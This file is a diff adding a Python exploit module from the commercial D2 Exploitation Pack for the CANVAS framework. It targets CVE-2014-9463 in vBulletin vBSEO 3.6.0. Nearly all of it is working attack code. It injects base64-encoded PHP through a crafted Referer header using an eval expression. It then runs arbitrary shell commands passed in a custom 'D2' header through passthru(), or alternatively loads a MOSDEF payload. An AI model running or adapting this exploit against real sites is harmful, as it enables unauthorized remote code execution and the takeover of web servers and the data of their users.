@@ -1,0 +1,97 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2015
+#
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from ExploitTypes.phpexploit import *
+import canvasengine
+import urllib
+import libs.spkproxy as spkproxy
+
+# GUI info
+NAME = "vBulletin vBSEO 3.6.0 functions_vbseo_hook.php Referer Remote Code Execution Vulnerability"
+DESCRIPTION = "Remote code execution vulnerability in vBulletin 'vBSEO 3.6.0 functions_vbseo_hook.php Referer"
+VERSION = "1.0"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "vBSEO"
+DOCUMENTATION["Date public"] = "2015.01.08"
+DOCUMENTATION["VersionsAffected"] = "vBSEO <= 3.6.0"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "https://blog.sucuri.net/2015/01/vbseos-vulnerability-leads-to-remote-code-execution.html"
+DOCUMENTATION["CVE Name"] = "CVE-2014-9463"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9463"
+DOCUMENTATION["Notes"] = ""
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
+PROPERTY['VERSION'] = [ "All" ]
+
+NOTES = "self.targetpath must be set with the URL of a member profil with at least one visitor message."
+
+CHANGELOG = ""
+
+
+class theexploit(phpexploit):
+    def __init__(self):
+        phpexploit.__init__(self)
+        self.port = 80
+        self.host = ""
+        self.setVersions()
+        self.version = 0
+        self.done = 0
+        self.ssl = ""
+        self.name = NAME
+        self.basepath = "/"
+        self.basepaths = ["/vb4111/","/vb/","/"]
+        self.command = None
+        self.basicauth_user = ""
+        self.basicauth_password = ""
+        self.hostname = None
+        self.verb = "GET"        
+        self.targetpath = "members/admin.html"                 
+        self.foundstrings = ["vBSEO"]
+        self.testfile = "vbseocp.php"              
+        return
+
+    def geturlarguments(self):        
+        if self.ssl:
+            url = "https://%s%s"%(self.host,self.basepath)
+        else:
+            url = "http://%s%s"%(self.host,self.basepath)
+                        
+        if self.command:
+            self.log("Command: %s"%self.command)
+            command = b64encode(self.command).strip()
+            php = "error_reporting(0);if(getenv(HTTP_D2)){passthru(base64_decode(getenv(HTTP_D2)));}"
+            php = b64encode(php).strip()
+            self.ua.addHeader("D2", command)             
+        else:
+            php = self.get_php_to_mosdef()
+            php = b64encode(php).strip()            
+         
+        self.ua.addHeader("Referer", url+"?a=$stylevar[${${@eval(base64_decode("+php+"))}}]")                                
+        return "ajax=1"    
+
+    def parse_command_response(self, data):   
+        return data
+                    
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret=standard_callback_commandline(app)
